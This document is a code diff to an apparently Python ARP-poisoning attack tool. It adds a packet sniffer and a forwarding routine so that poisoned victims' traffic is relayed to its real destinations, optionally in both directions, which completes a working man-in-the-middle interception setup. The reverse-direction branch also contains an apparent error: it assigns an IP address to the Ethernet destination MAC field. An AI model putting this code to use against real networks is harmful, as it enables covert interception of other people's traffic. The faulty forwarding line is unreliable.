@@ -81,6 +81,13 @@ class ARPAttackWorker(QObject):
         for _ in range(self.settings.initial_packets):
             send_poisonous_packets(self.settings)
 
+        if self.settings.ip_forwarding:
+            self.sniffer = AsyncSniffer(
+                iface=self.settings.interface.name,
+                prn=self.forward_packet
+            )
+            self.sniffer.start()
+
         # perform poisoning every so often to prevent chache healing
         self.timer = QTimer(self)
         self.timer.timeout.connect(self.poison)
@@ -97,5 +104,61 @@ class ARPAttackWorker(QObject):
         for _ in range(self.settings.initial_packets):
             send_antidotal_packets(self.settings)
 
+        if self.settings.ip_forwarding:
+            self.sniffer.stop(join=True)
+
         self.timer.stop()
         self.finished.emit()
+
+    def forward_packet(self, packet: Packet):
+        interface = self.settings.interface
+        victims = self.settings.sources
+        destinations = self.settings.destinations
+
+        # We can only forward packets if we know where it should go
+        if (not (Ether in packet and IP in packet)
+        # Skip packets that are not addressed to our interface
+        or (packet[Ether].dst != interface.mac_addr.lower())
+        # Don't forward packets that we sent
+        or (packet[IP].src == interface.ip_addr)
+        # Don't forward packets that are sent to us
+        or (packet[IP].dst == interface.ip_addr)):
+            return
+
+        def find_victim(ip: str):
+            for victim in victims:
+                if victim.ip_addr == ip:
+                    return victim
+
+            return None
+
+        def find_destination(ip: str):
+            for destination in destinations:
+                if destination.ip_addr == ip:
+                    return destination
+
+            return None
+
+        # victims -> destinations
+        victim = find_victim(packet[IP].src)
+        destination = find_destination(packet[IP].dst)
+
+        if victim != None and destination != None:
+            packet[Ether].src = interface.mac_addr
+            packet[Ether].dst = destination.mac_addr
+
+            sendp(packet, verbose=0)
+            return
+
+        if not self.settings.two_way:
+            return
+
+        # destinations -> victims
+        victim = find_victim(packet[IP].dst)
+        destination = find_destination(packet[IP].src)
+
+        if victim != None and destination != None:
+            packet[Ether].src = interface.mac_addr
+            packet[Ether].dst = victim.ip_addr
+
+            sendp(packet, verbose=0)
